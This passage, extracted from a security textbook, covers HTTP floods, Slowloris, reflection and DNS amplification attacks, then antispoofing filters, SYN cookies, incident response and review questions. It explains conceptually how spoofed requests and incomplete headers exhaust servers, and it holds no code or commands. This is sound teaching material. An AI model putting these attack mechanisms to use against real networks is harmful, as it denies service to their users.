biloxi.com\\r\\nM07_STAL0611_04_GE_C07.indd 259 10/11/17 2:54 PM\\r\\nhttps://sanet.st/blogs/polatebooks\\n\\n\\n260 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nHTTP-Based Attacks\\r\\nWe consider two different approaches to exploiting the Hypertext Transfer Protocol \\r\\n(HTTP) to deny service.\\r\\nHTTP FLOOD An HTTP flood refers to an attack that bombards Web servers with \\r\\nHTTP requests. Typically, this is a DDoS attack, with HTTP requests coming from \\r\\nmany different bots. The requests can be designed to consume considerable resources. \\r\\nFor example, an HTTP request to download a large file from the target causes the \\r\\nWeb server to read the file from hard disk, store it in memory, convert it into a packet \\r\\nstream, then transmit the packets. This process consumes memory, processing, and \\r\\ntransmission resources.\\r\\nA variant of this attack is known as a recursive HTTP flood. In this case, the \\r\\nbots start from a given HTTP link and then follows all links on the provided website \\r\\nin a recursive way. This is also called spidering.\\r\\nSLOWLORIS An intriguing and unusual form of HTTP-based attack is Slowloris\\r\\n[SOUR12], [DAMO12]. Slowloris exploits the common server technique of using \\r\\nmultiple threads to support multiple requests to the same server application. It \\r\\nattempts to monopolize all of the available request handling threads on the Web \\r\\nserver by sending HTTP requests that never complete. Since each request consumes \\r\\na thread, the Slowloris attack eventually consumes all of the Web server’s connection \\r\\ncapacity, effectively denying access to legitimate users.\\r\\nThe HTTP protocol specification (RFC2616) states that a blank line must be \\r\\nused to indicate the end of the request headers and the beginning of the payload, \\r\\nif any. Once the entire request is received, the Web server may then respond. The \\r\\nSlowloris attack operates by establishing multiple connections to the Web server. On \\r\\neach connection, it sends an incomplete request that does not include the terminating \\r\\nnewline sequence. The attacker sends additional header lines periodically to keep the \\r\\nconnection alive, but never sends the terminating newline sequence. The Web server \\r\\nkeeps the connection open, expecting more information to complete the request. As \\r\\nthe attack continues, the volume of long-standing Slowloris connections increases, \\r\\neventually consuming all available Web server connections, thus rendering the Web \\r\\nserver unavailable to respond to legitimate requests.\\r\\nSlowloris is different from typical denials of service in that Slowloris traffic \\r\\nutilizes legitimate HTTP traffic, and does not rely on using special “bad” HTTP \\r\\nrequests that exploit bugs in specific HTTP servers. Because of this, existing intrusion \\r\\ndetection and intrusion prevention solutions that rely on signatures to detect attacks \\r\\nwill generally not recognize Slowloris. This means that Slowloris is capable of being \\r\\neffective even when standard enterprise-grade intrusion detection and intrusion pre\\ufffevention systems are in place.\\r\\nThere are a number of countermeasures that can be taken against Slowloris \\r\\ntype attacks, including limiting the rate of incoming connections from a particular \\r\\nhost; varying the timeout on connections as a function of the number of connec\\ufffetions; and delayed binding. Delayed binding is performed by load balancing soft\\ufffeware. In essence, the load balancer performs an HTTP request header completeness \\r\\ncheck, which means that the HTTP request will not be sent to the appropriate \\r\\nWeb server until the final two carriage return and line feeds are sent by the HTTP \\r\\nM07_STAL0611_04_GE_C07.indd 260 10/11/17 2:54 PM\\n\\n\\n7.5 / REFLECTOR AND AMPLIFIER ATTACKS 261\\r\\nclient. This is the key bit of information. Basically, delayed binding ensures that \\r\\nyour Web server or proxy will never see any of the incomplete requests being sent \\r\\nout by Slowloris.\\r\\n7.5 REFLECTOR AND AMPLIFIER ATTACKS\\r\\nIn contrast to DDoS attacks, where the intermediaries are compromised systems \\r\\nrunning the attacker’s programs, reflector and amplifier attacks use network systems \\r\\nfunctioning normally. The attacker sends a network packet with a spoofed source \\r\\naddress to a service running on some network server. The server responds to this \\r\\npacket, sending it to the spoofed source address that belongs to the actual attack \\r\\ntarget. If the attacker sends a number of requests to a number of servers, all with the \\r\\nsame spoofed source address, the resulting flood of responses can overwhelm the \\r\\ntarget’s network link. The fact that normal server systems are being used as inter\\ufffemediaries, and that their handling of the packets is entirely conventional, means \\r\\nthese attacks can be easier to deploy and harder to trace back to the actual attacker. \\r\\nThere are two basic variants of this type of attack: the simple reflection attack and \\r\\nthe amplification attack.\\r\\nReflection Attacks\\r\\nThe reflection attack is a direct implementation of this type of attack. The attacker \\r\\nsends packets to a known service on the intermediary with a spoofed source address \\r\\nof the actual target system. When the intermediary responds, the response is sent to \\r\\nthe target. Effectively this reflects the attack off the intermediary, which is termed \\r\\nthe reflector, and is why this is called a reflection attack.\\r\\nIdeally, the attacker would like to use a service that created a larger response \\r\\npacket than the original request. This allows the attacker to convert a lower volume \\r\\nstream of packets from the originating system into a higher volume of packet data \\r\\nfrom the intermediary directed at the target. Common UDP services are often used \\r\\nfor this purpose. Originally, the echo service was a favored choice, although it does \\r\\nnot create a larger response packet. However, any generally accessible UDP service \\r\\ncould be used for this type of attack. The chargen, DNS, SNMP, or ISAKMP6\\r\\n services \\r\\nhave all been exploited in this manner, in part because they can be made to generate \\r\\nlarger response packets directed at the target.\\r\\nThe intermediary systems are often chosen to be high-capacity network servers \\r\\nor routers with very good network connections. This means they can generate high \\r\\nvolumes of traffic if necessary, and if not, the attack traffic can be obscured in the nor\\ufffemal high volumes of traffic flowing through them. If the attacker spreads the attack \\r\\nover a number of intermediaries in a cyclic manner, then the attack traffic flow may \\r\\n6\\r\\nChargen is the character generator diagnostic service that returns a stream of characters to the client that \\r\\nconnects to it. Domain Name Service (DNS) is used to translate between names and IP addresses. The \\r\\nSimple Network Management Protocol (SNMP) is used to manage network devices by sending queries \\r\\nto which they can respond with large volumes of detailed management information. The Internet Security \\r\\nAssociation and Key Management Protocol (ISAKMP) provides the framework for managing keys in the \\r\\nIP Security Architecture (IPsec), as we will discuss in Chapter 22.\\r\\nM07_STAL0611_04_GE_C07.indd 261 10/11/17 2:54 PM\\n\\n\\n262 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nwell not be easily distinguished from the other traffic flowing from the system. This, \\r\\ncombined with the use of spoofed source addresses, greatly increases the difficulty of \\r\\nany attempt to trace the packet flows back to the attacker’s system.\\r\\nAnother variant of reflection attack uses TCP SYN packets and exploits the \\r\\nnormal three-way handshake used to establish a TCP connection. The attacker sends \\r\\na number of SYN packets with spoofed source addresses to the chosen intermedi\\ufffearies. In turn, the intermediaries respond with a SYN-ACK packet to the spoofed \\r\\nsource address, which is actually the target system. The attacker uses this attack with \\r\\na number of intermediaries. The aim is to generate high enough volumes of packets to \\r\\nflood the link to the target system. The target system will respond with a RST packet \\r\\nfor any that get through, but by then the attack has already succeeded in overwhelm\\ufffeing the target’s network link.\\r\\nThis attack variant is a flooding attack that differs from the SYN spoofing attack \\r\\nwe discussed earlier in this chapter. The goal is to flood the network link to the target, \\r\\nnot to exhaust its network handling resources. Indeed, the attacker would usually \\r\\ntake care to limit the volume of traffic to any particular intermediary to ensure that \\r\\nit is not overwhelmed by, or even notices, this traffic. This is both because its con\\ufffetinued correct functioning is an essential component of this attack, as is limiting the \\r\\nchance of the attacker’s actions being detected. The 2002 attack on GRC.com was of \\r\\nthis form. It used connection requests to the BGP routing service on core routers as \\r\\nthe primary intermediaries. These generated sufficient response traffic to completely \\r\\nblock normal access to GRC.com. However, as GRC.com discovered, once this traffic \\r\\nwas blocked, a range of other services, on other intermediaries, were also being used. \\r\\nGRC noted in its report on this attack that “you know you’re in trouble when packet \\r\\nfloods are competing to flood you.”\\r\\nAny generally accessible TCP service can be used in this type of attack. Given \\r\\nthe large number of servers available on the Internet, including many well-known \\r\\nservers with very high capacity network links, there are many possible intermediaries \\r\\nthat can be used. What makes this attack even more effective is that the individual \\r\\nTCP connection requests are indistinguishable from normal connection requests \\r\\ndirected to the server. It is only if they are running some form of intrusion detection \\r\\nsystem that detects the large numbers of failed connection requests from one system \\r\\nthat this attack might be detected and possibly blocked. If the attacker is using a \\r\\nnumber of intermediaries, then it is very likely that even if some detect and block the \\r\\nattack, many others will not, and the attack will still succeed.\\r\\nA further variation of the reflector attack establishes a self-contained loop \\r\\nbetween the intermediary and the target system. Both systems act as reflectors. \\r\\nFigure 7.6 shows this type of attack. The upper part of the figure shows normal \\r\\nDomain Name System operation.7\\r\\n The DNS client sends a query from its UDP port \\r\\n1792 to the server’s DNS port 53 to obtain the IP address of a domain name. The \\r\\nDNS server sends a UDP response packet including the IP address. The lower part \\r\\nof the figure shows a reflection attack using DNS. The attacker sends a query to the \\r\\nDNS server with a spoofed IP source address of j.k.l.m; this is the IP address of the \\r\\ntarget. The attacker uses port 7, which is usually associated with echo, a reflector \\r\\n7\\r\\nSee Appendix H for an overview of DNS.\\r\\nM07_STAL0611_04_GE_C07.indd 262 10/11/17 2:54 PM\\n\\n\\n7.5 / REFLECTOR AND AMPLIFIER ATTACKS 263\\r\\nservice. The DNS server then sends a response to the victim of the attack, j.k.l.m, \\r\\naddressed to port 7. If the victim is offering the echo service, it may create a packet \\r\\nthat echoes the received data back to the DNS server. This can cause a loop between \\r\\nthe DNS server and the victim if the DNS server responds to the packets sent by the \\r\\nvictim. Most reflector attacks can be prevented through network-based and host\\ufffebased firewall rulesets that reject suspicious combinations of source and destination \\r\\nports.\\r\\nWhile very effective if possible, this type of attack is fairly easy to filter for \\r\\nbecause the combinations of service ports used should never occur in normal network \\r\\noperation.\\r\\nWhen implementing any of these reflection attacks, the attacker could use just \\r\\none system as the original source of packets. This suffices, particularly if a service is \\r\\nused that generates larger response packets than those originally sent to the inter\\ufffemediary. Alternatively, multiple systems might be used to generate higher volumes of \\r\\ntraffic to be reflected and to further obscure the path back to the attacker. Typically \\r\\na botnet would be used in this case.\\r\\nAnother characteristic of reflection attacks is the lack of backscatter traffic. \\r\\nIn both direct flooding attacks and SYN spoofing attacks, the use of spoofed source \\r\\naddresses results in response packets being scattered across the Internet and thus \\r\\ndetectable. This allows security researchers to estimate the volumes of such attacks. \\r\\nIn reflection attacks, the spoofed source address directs all the packets at the desired \\r\\ntarget and any responses to the intermediary. There is no generally visible side effect \\r\\nof these attacks, making them much harder to quantify. Evidence of them is only \\r\\navailable from either the targeted systems and their ISPs or the intermediary systems. \\r\\nIn either case, specific instrumentation and monitoring would be needed to collect \\r\\nthis evidence.\\r\\nFundamental to the success of reflection attacks is the ability to create spoofed\\ufffesource packets. If filters are in place that block spoofed-source packets, as described \\r\\nin (RFC 2827), then these attacks are simply not possible. This is the most basic, \\r\\nFigure 7.6 DNS Reflection Attack\\r\\nIP: a.b.c.d\\r\\nIP: a.b.c.d IP: j.k.l.m\\r\\nVictim\\r\\nLoop\\r\\npossible\\r\\nDNS\\r\\nserver\\r\\nNormal\\r\\nuser\\r\\nAttacker\\r\\nDNS\\r\\nserver\\r\\nIP: w.x.y.z\\r\\nFrom: a.b.c.d:1792\\r\\nTo: w.x.y.z.53\\r\\nFrom: w.x.y.z.53\\r\\nTo: a.b.c.d:1792\\r\\nFrom: j.k.l.m:7\\r\\nTo: w.x.y.z.53\\r\\nFrom: w.x.y.z.53\\r\\nTo: j.k.l.m:7\\r\\nFrom: j.k.l.m:7\\r\\nTo: w.x.y.z.53\\r\\n1\\r\\n1\\r\\n2\\r\\n2\\r\\n3\\r\\nIP: w.x.y.z\\r\\nM07_STAL0611_04_GE_C07.indd 263 10/11/17 2:54 PM\\n\\n\\n264 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nfundamental defense against such attacks. This is not the case with either SYN \\r\\nspoofing or flooding attacks (distributed or not). They can succeed using real source \\r\\naddresses, with the consequences already noted.\\r\\nAmplification Attacks\\r\\nAmplification attacks are a variant of reflector attacks and also involve sending a \\r\\npacket with a spoofed source address for the target system to intermediaries. They \\r\\ndiffer in generating multiple response packets for each original packet sent. This \\r\\ncan be achieved by directing the original request to the broadcast address for some \\r\\nnetwork. As a result, all hosts on that network can potentially respond to the request, \\r\\ngenerating a flood of responses as shown in Figure 7.7. It is only necessary to use \\r\\na service handled by large numbers of hosts on the intermediate network. A ping \\r\\nflood using ICMP echo request packets was a common choice, since this service \\r\\nis a fundamental component of TCP/IP implementations and was often allowed \\r\\ninto networks. The well-known smurf DoS program used this mechanism and was \\r\\nwidely popular for some time. Another possibility is to use a suitable UDP service, \\r\\nsuch as the echo service. The fraggle program implemented this variant. Note that \\r\\nTCP services cannot be used in this type of attack; because they are connection \\r\\noriented, they cannot be directed at a broadcast address. Broadcasts are inherently \\r\\nconnectionless.\\r\\nThe best additional defense against this form of attack is to not allow directed \\r\\nbroadcasts to be routed into a network from outside. Indeed, this is another long\\ufffestanding security recommendation, unfortunately about as widely implemented as \\r\\nthat for blocking spoofed source addresses. If these forms of filtering are in place, \\r\\nthese attacks cannot succeed. Another defense is to limit network services such as \\r\\necho and ping from being accessed from outside an organization. This restricts which \\r\\nservices could be used in these attacks, at a cost in ease of analyzing some legitimate \\r\\nnetwork problems.\\r\\nAttackers scan the Internet looking for well-connected networks that do allow \\r\\ndirected broadcasts and that implement suitable services attackers can reflect off. \\r\\nThese lists are traded and used to implement such attacks.\\r\\nFigure 7.7 Amplification Attack\\r\\nRef lector\\r\\nintermediaries\\r\\nTarget\\r\\nAttacker\\r\\nZombies\\r\\nM07_STAL0611_04_GE_C07.indd 264 10/11/17 2:54 PM\\n\\n\\n7.6 / DEFENSES AGAINST DENIAL-OF-SERVICE ATTACKS 265\\r\\nDNS Amplification Attacks\\r\\nIn addition to the DNS reflection attack discussed previously, a further variant of an \\r\\namplification attack uses packets directed at a legitimate DNS server as the intermedi\\ufffeary system. Attackers gain attack amplification by exploiting the behavior of the DNS \\r\\nprotocol to convert a small request into a much larger response. This contrasts with the \\r\\noriginal amplifier attacks, which use responses from multiple systems to a single request \\r\\nto gain amplification. Using the classic DNS protocol, a 60-byte UDP request packet \\r\\ncan easily result in a 512-byte UDP response, the maximum traditionally allowed. All \\r\\nthat is needed is a name server with DNS records large enough for this to occur.\\r\\nThese attacks have been seen for several years. More recently, the DNS protocol\\r\\nhas been extended to allow much larger responses of over 4000 bytes to support \\r\\nextended DNS features such as IPv6, security, and others. By targeting servers that \\r\\nsupport the extended DNS protocol, significantly greater amplification can be \\r\\nachieved than with the classic DNS protocol.\\r\\nIn this attack, a selection of suitable DNS servers with good network connec\\ufffetions are chosen. The attacker creates a series of DNS requests containing the spoofed \\r\\nsource address of the target system. These are directed at a number of the selected \\r\\nname servers. The servers respond to these requests, sending the replies to the spoofed \\r\\nsource, which appears to them to be the legitimate requesting system. The target is then \\r\\nflooded with their responses. Because of the amplification achieved, the attacker need \\r\\nonly generate a moderate flow of packets to cause a larger, amplified flow to flood and \\r\\noverflow the link to the target system. Intermediate systems will also experience signifi\\ufffecant loads. By using a number of high-capacity, well-connected systems, the attacker can \\r\\nensure that intermediate systems are not overloaded, allowing the attack to proceed.\\r\\nA further variant of this attack exploits recursive DNS name servers. This is a \\r\\nbasic feature of the DNS protocol that permits a DNS name server to query a number \\r\\nof other servers to resolve a query for its clients. The intention was that this feature \\r\\nis used to support local clients only. However, many DNS systems support recursion \\r\\nby default for any requests. They are known as open recursive DNS servers. Attack\\ufffeers may exploit such servers for a number of DNS-based attacks, including the DNS \\r\\namplification DoS attack. In this variant, the attacker targets a number of open recur\\ufffesive DNS servers. The name information being used for the attack need not reside \\r\\non these servers, but can be sourced from anywhere on the Internet. The results are \\r\\ndirected at the desired target using spoofed source addresses.\\r\\nLike all the reflection-based attacks, the basic defense against these is to pre\\ufffevent the use of spoofed source addresses. Appropriate configuration of DNS servers, \\r\\nin particular limiting recursive responses to internal client systems only, as described \\r\\nin RFC 5358, can restrict some variants of this attack.\\r\\n7.6 DEFENSES AGAINST DENIAL-OF-SERVICE ATTACKS\\r\\nThere are a number of steps that can be taken both to limit the consequences of being \\r\\nthe target of a DoS attack and to limit the chance of your systems being compromised \\r\\nthen used to launch DoS attacks. It is important to recognize that these attacks cannot \\r\\nbe prevented entirely. In particular, if an attacker can direct a large enough volume of \\r\\nlegitimate traffic to your system, then there is a high chance this will overwhelm your \\r\\nM07_STAL0611_04_GE_C07.indd 265 10/11/17 2:54 PM\\n\\n\\n266 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nsystem’s network connection, and thus limit legitimate traffic requests from other \\r\\nusers. Indeed, this sometimes occurs by accident as a result of high publicity about a \\r\\nspecific site. Classically, a posting to the well-known Slashdot news aggregation site \\r\\noften results in overload of the referenced server system. Similarly, when popular \\r\\nsporting events such as the Olympics or Soccer World Cup matches occur, sites report\\ufffeing on them experience very high traffic levels. This has led to the terms slashdotted, \\r\\nflash crowd, or flash event being used to describe such occurrences. There is very \\r\\nlittle that can be done to prevent this type of either accidental or deliberate overload \\r\\nwithout compromising network performance also. The provision of significant excess \\r\\nnetwork bandwidth and replicated distributed servers is the usual response, particu\\ufffelarly when the overload is anticipated. This is regularly done for popular sporting sites. \\r\\nHowever, this response does have a significant implementation cost.\\r\\nIn general, there are four lines of defense against DDoS attacks [PENG07, \\r\\nCHAN02]:\\r\\n• Attack prevention and preemption (before the attack): These mechanisms \\r\\nenable the victim to endure attack attempts without denying service to legiti\\ufffemate clients. Techniques include enforcing policies for resource consumption \\r\\nand providing backup resources available on demand. In addition, prevention \\r\\nmechanisms modify systems and protocols on the Internet to reduce the pos\\ufffesibility of DDoS attacks.\\r\\n• Attack detection and filtering (during the attack): These mechanisms attempt \\r\\nto detect the attack as it begins and respond immediately. This minimizes the \\r\\nimpact of the attack on the target. Detection involves looking for suspicious \\r\\npatterns of behavior. Response involves filtering out packets likely to be part \\r\\nof the attack.\\r\\n• Attack source traceback and identification (during and after the attack): This is \\r\\nan attempt to identify the source of the attack as a first step in preventing future \\r\\nattacks. However, this method typically does not yield results fast enough, if at \\r\\nall, to mitigate an ongoing attack.\\r\\n• Attack reaction (after the attack): This is an attempt to eliminate or curtail the \\r\\neffects of an attack.\\r\\nWe discuss the first of these lines of defense in this section then consider the \\r\\nremaining three in Section 7.7.\\r\\nA critical component of many DoS attacks is the use of spoofed source \\r\\naddresses. These either obscure the originating system of direct and distributed DoS \\r\\nattacks or are used to direct reflected or amplified traffic to the target system. Hence, \\r\\none of the fundamental, and longest standing, recommendations for defense against \\r\\nthese attacks is to limit the ability of systems to send packets with spoofed source \\r\\naddresses. RFC 2827, Network Ingress Filtering: Defeating Denial-of-service attacks \\r\\nwhich employ IP Source Address Spoofing,\\r\\n8\\r\\n directly makes this recommendation, as \\r\\ndo SANS, CERT, and many other organizations concerned with network security.\\r\\n8\\r\\nNote that while the title uses the term Ingress Filtering, the RFC actually describes Egress Filtering, with \\r\\nthe behavior we discuss. True ingress filtering rejects outside packets using source addresses that belong \\r\\nto the local network. This provides protection against only a small number of attacks.\\r\\nM07_STAL0611_04_GE_C07.indd 266 10/11/17 2:54 PM\\n\\n\\n7.6 / DEFENSES AGAINST DENIAL-OF-SERVICE ATTACKS 267\\r\\nThis filtering needs to be done as close to the source as possible, by routers \\r\\nor gateways knowing the valid address ranges of incoming packets. Typically, this is \\r\\nthe ISP providing the network connection for an organization or home user. An ISP \\r\\nknows which addresses are allocated to all its customers and hence is best placed to \\r\\nensure that valid source addresses are used in all packets from its customers. This \\r\\ntype of filtering can be implemented using explicit access control rules in a router \\r\\nto ensure that the source address on any customer packet is one allocated to the \\r\\nISP. Alternatively, filters may be used to ensure that the path back to the claimed \\r\\nsource address is the one being used by the current packet. For example, this may \\r\\nbe done on Cisco routers using the “ip verify unicast reverse-path” command. This \\r\\nlatter approach may not be possible for some ISPs that use a complex, redundant \\r\\nrouting infrastructure. Implementing some form of such a filter ensures that the ISP’s \\r\\ncustomers cannot be the source of spoofed packets. Regrettably, despite this being \\r\\na well-known recommendation, many ISPs still do not perform this type of filtering. \\r\\nIn particular, those with large numbers of broadband-connected home users are of \\r\\nmajor concern. Such systems are often targeted for attack as they are often less well \\r\\nsecured than corporate systems. Once compromised, they are then used as inter\\ufffemediaries in other attacks, such as DoS attacks. By not implementing antispoofing \\r\\nfilters, ISPs are clearly contributing to this problem. One argument often advanced \\r\\nfor not doing so is the performance impact on their routers. While filtering does incur \\r\\na small penalty, so does having to process volumes of attack traffic. Given the high \\r\\nprevalence of DoS attacks, there is simply no justification for any ISP or organization \\r\\nnot to implement such a basic security recommendation.\\r\\nAny defenses against flooding attacks need to be located back in the Internet \\r\\ncloud, not at a target organization’s boundary router, since this is usually located after \\r\\nthe resource being attacked. The filters must be applied to traffic before it leaves the \\r\\nISP’s network, or even at the point of entry to their network. While it is not possible, \\r\\nin general, to identify packets with spoofed source addresses, the use of a reverse path \\r\\nfilter can help identify some such packets where the path from the ISP to the spoofed \\r\\naddress differs to that used by the packet to reach the ISP. In addition, attacks using \\r\\nparticular packet types, such as ICMP floods or UDP floods to diagnostic services, can \\r\\nbe throttled by imposing limits on the rate at which these packets will be accepted. \\r\\nIn normal network operation, these should comprise a relatively small fraction of \\r\\nthe overall volume of network traffic. Many routers, particularly the high-end rout\\ufffeers used by ISPs, have the ability to limit packet rates. Setting appropriate rate limits \\r\\non these types of packets can help mitigate the effect of packet floods using them, \\r\\nallowing other types of traffic to flow to the targeted organization even should an \\r\\nattack occur.\\r\\nIt is possible to specifically defend against the SYN spoofing attack by using \\r\\na modified version of the TCP connection handling code. Instead of saving the con\\ufffenection details on the server, critical information about the requested connection is \\r\\ncryptographically encoded in a cookie that is sent as the server’s initial sequence num\\ufffeber. This is sent in the SYN-ACK packet from the server back to the client. When a \\r\\nlegitimate client responds with an ACK packet containing the incremented sequence \\r\\nnumber cookie, the server is then able to reconstruct the information about the con\\ufffenection that it normally would have saved in the known TCP connections table. \\r\\nTypically, this technique is only used when the table overflows. It has the advantage of \\r\\nM07_STAL0611_04_GE_C07.indd 267 10/11/17 2:54 PM\\n\\n\\n268 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nnot consuming any memory resources on the server until the three-way TCP connec\\ufffetion handshake is completed. The server then has greater confidence that the source \\r\\naddress does indeed correspond with a real client that is interacting with the server.\\r\\nThere are some disadvantages of this technique. It does take computation \\r\\nresources on the server to calculate the cookie. It also blocks the use of certain TCP \\r\\nextensions, such as large windows. The request for such an extension is normally \\r\\nsaved by the server, along with other details of the requested connection. However, \\r\\nthis connection information cannot be encoded in the cookie as there is not enough \\r\\nroom to do so. Since the alternative is for the server to reject the connection entirely \\r\\nas it has no resources left to manage the request, this is still an improvement in the \\r\\nsystem’s ability to handle high connection-request loads. This approach was inde\\ufffependently invented by a number of people. The best-known variant is SYN Cookies, \\r\\nwhose principal originator is Daniel Bernstein. It is available in recent FreeBSD and \\r\\nLinux systems, though it is not enabled by default. A variant of this technique is also \\r\\nincluded in Windows 2000, XP, and later. This is used whenever their TCP connec\\ufffetions table overflows.\\r\\nAlternatively, the system’s TCP/IP network code can be modified to selectively \\r\\ndrop an entry for an incomplete connection from the TCP connections table when \\r\\nit overflows, allowing a new connection attempt to proceed. This is known as selec\\ufffetive drop or random drop. On the assumption that the majority of the entries in an \\r\\noverflowing table result from the attack, it is more likely that the dropped entry will \\r\\ncorrespond to an attack packet. Hence, its removal will have no consequence. If not, \\r\\nthen a legitimate connection attempt will fail, and will have to retry. However, this \\r\\napproach does give new connection attempts a chance of succeeding rather than \\r\\nbeing dropped immediately when the table overflows.\\r\\nAnother defense against SYN spoofing attacks includes modifying parameters \\r\\nused in a system’s TCP/IP network code. These include the size of the TCP connec\\ufffetions table and the timeout period used to remove entries from this table when no \\r\\nresponse is received. These can be combined with suitable rate limits on the organiza\\ufffetion’s network link to manage the maximum allowable rate of connection requests. \\r\\nNone of these changes can prevent these attacks, though they do make the attacker’s \\r\\ntask harder.\\r\\nThe best defense against broadcast amplification attacks is to block the use of \\r\\nIP-directed broadcasts. This can be done either by the ISP or by any organization \\r\\nwhose systems could be used as an intermediary. As we noted earlier in this chapter, \\r\\nthis and antispoofing filters are long-standing security recommendations that all orga\\ufffenizations should implement. More generally, limiting or blocking traffic to suspicious \\r\\nservices, or combinations of source and destination ports, can restrict the types of \\r\\nreflection attacks that can be used against an organization.\\r\\nDefending against attacks on application resources generally requires modifica\\ufffetion to the applications targeted, such as Web servers. Defenses may involve attempts \\r\\nto identify legitimate, generally human initiated, interactions from automated DoS \\r\\nattacks. These often take the form of a graphical puzzle, a captcha, which is easy for \\r\\nmost humans to solve but difficult to automate. This approach is used by many of the \\r\\nlarge portal sites such as Hotmail and Yahoo. Alternatively, applications may limit \\r\\nthe rate of some types of interactions in order to continue to provide some form of \\r\\nservice. Some of these alternatives are explored in [KAND05].\\r\\nM07_STAL0611_04_GE_C07.indd 268 10/11/17 2:54 PM\\n\\n\\n7.7 / RESPONDING TO A DENIAL-OF-SERVICE ATTACK 269\\r\\nBeyond these direct defenses against DoS attack mechanisms, overall good \\r\\nsystem security practices should be maintained. The aim is to ensure that your sys\\ufffetems are not compromised and used as zombie systems. Suitable configuration and \\r\\nmonitoring of high performance, well-connected servers is also needed to help ensure \\r\\nthat they do not contribute to the problem as potential intermediary servers.\\r\\nLastly, if an organization is dependent on network services, it should consider \\r\\nmirroring and replicating these servers over multiple sites with multiple network \\r\\nconnections. This is good general practice for high-performance servers, and provides \\r\\ngreater levels of reliability and fault tolerance in general and not just a response to \\r\\nthese types of attack.\\r\\n7.7 RESPONDING TO A DENIAL-OF-SERVICE ATTACK\\r\\nTo respond successfully to a DoS attack, a good incident response plan is needed. This \\r\\nmust include details of how to contact technical personal for your Internet service \\r\\nprovider(s). This contact must be possible using nonnetworked means, since when \\r\\nunder attack your network connection may well not be usable. DoS attacks, particu\\ufffelarly flooding attacks, can only be filtered upstream of your network connection. \\r\\nThe plan should also contain details of how to respond to the attack. The division \\r\\nof responsibilities between organizational personnel and the ISP will depend on the \\r\\nresources available and technical capabilities of the organization.\\r\\nWithin an organization, you should implement the standard antispoofing, \\r\\ndirected broadcast, and rate limiting filters we discussed earlier in this chapter. Ide\\ufffeally, you should also have some form of automated network monitoring and intru\\ufffesion detection system running so that personnel will be notified should abnormal \\r\\ntraffic be detected. We will discuss such systems in Chapter 8. Research continues as \\r\\nto how best identify abnormal traffic. It may be on the basis of changes in patterns \\r\\nof flow information, source addresses, or other traffic characteristics, as [CARL06] \\r\\ndiscusses. It is important that an organization knows its normal traffic patterns so it \\r\\nhas a baseline with which to compare abnormal traffic flows. Without such systems \\r\\nand knowledge, the earliest indication is likely to be a report from users inside or \\r\\noutside the organization that its network connection has failed. Identifying the reason \\r\\nfor this failure, whether attack, misconfiguration, or hardware or software failure, can \\r\\ntake valuable additional time to identify.\\r\\nWhen a DoS attack is detected, the first step is to identify the type of attack \\r\\nand hence the best approach to defend against it. Typically, this involves capturing \\r\\npackets flowing into the organization and analyzing them, looking for common attack \\r\\npacket types. This may be done by organizational personnel using suitable network \\r\\nanalysis tools. If the organization lacks the resources and skill to do this, it will need to \\r\\nhave its ISP perform this capture and analysis. From this analysis, the type of attack is \\r\\nidentified and suitable filters are designed to block the flow of attack packets. These \\r\\nhave to be installed by the ISP on its routers. If the attack targets a bug on a system \\r\\nor application, rather than high traffic volumes, then this must be identified and steps \\r\\ntaken to correct it and prevent future attacks.\\r\\nThe organization may also wish to ask its ISP to trace the flow of packets back \\r\\nin an attempt to identify their source. However, if spoofed source addresses are used, \\r\\nM07_STAL0611_04_GE_C07.indd 269 10/11/17 2:54 PM\\n\\n\\n270 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nthis can be difficult and time-consuming. Whether this is attempted may well depend \\r\\non whether the organization intends to report the attack to the relevant law enforce\\ufffement agencies. In such a case, additional evidence must be collected and actions \\r\\ndocumented to support any subsequent legal action.\\r\\nIn the case of an extended, concerted, flooding attack from a large number of \\r\\ndistributed or reflected systems, it may not be possible to successfully filter enough \\r\\nof the attack packets to restore network connectivity. In such cases, the organization \\r\\nneeds a contingency strategy either to switch to alternate backup servers or to rapidly \\r\\ncommission new servers at a new site with new addresses, in order to restore service. \\r\\nWithout forward planning to achieve this, the consequence of such an attack will be \\r\\nextended loss of network connectivity. If the organization depends on this connection \\r\\nfor its function, the consequences on it may be significant.\\r\\nFollowing the immediate response to this specific type of attack, the organiza\\ufffetion’s incident response policy may specify further steps that are taken to respond \\r\\nto contingencies like this. This should certainly include analyzing the attack and \\r\\nresponse in order to gain benefit from the experience and to improve future han\\ufffedling. Ideally, the organization’s security can be improved as a result. We will discuss \\r\\nall these aspects of incident response further in Chapter 17.\\r\\n7.8 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\namplification attack\\r\\navailability\\r\\nbackscatter traffic botnet\\r\\ndenial of service (DoS)\\r\\ndirected broadcast\\r\\ndistributed denial of service \\r\\n(DDoS)\\r\\nDNS amplification attack\\r\\nflash crowd\\r\\nflooding attack\\r\\nInternet Control Message \\r\\nProtocol (ICMP)\\r\\nICMP flood\\r\\npoison packet\\r\\nrandom drop\\r\\nreflection attack\\r\\nslashdotted\\r\\nsource address spoofing\\r\\nSYN cookie\\r\\nSYN flood\\r\\nSYN spoofing\\r\\nTCP\\r\\nthree-way TCP handshake\\r\\nUDP\\r\\nUDP flood\\r\\nzombie\\r\\nReview Questions\\r\\n7.1 Define a denial-of-service (DoS) attack.\\r\\n7.2 State the difference between a SYN flooding attack and a SYN spoofing attack.\\r\\n7.3 What is the goal of an HTTP flood attack?\\r\\n7.4 What is a poison packet attack? Give two examples of such an attack.\\r\\n7.5 Why do many DoS attacks use packets with spoofed source addresses?\\r\\n7.6 What is “backscatter traffic?” Which types of DoS attacks can it provide information \\r\\non? Which types of attacks does it not provide any information on?\\r\\n7.7 What is the difference between a DDoS attack and a classic DoS attack? Why are \\r\\nDDoS attacks considered more potent than classic DoS attacks?\\r\\n7.8 What architecture does a DDoS attack typically use?\\r\\nM07_STAL0611_04_GE_C07.indd 270 10/11/17 2:54 PM\\n\\n\\n7.8 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 271\\r\\n7.9 Define an HTTP flood.\\r\\n7.10 Define a Slowloris attack.\\r\\n7.11 From an attacker’s perspective, what are the drawbacks of a classic ping flood attack?\\r\\n7.12 What defenses are possible against nonspoofed flooding 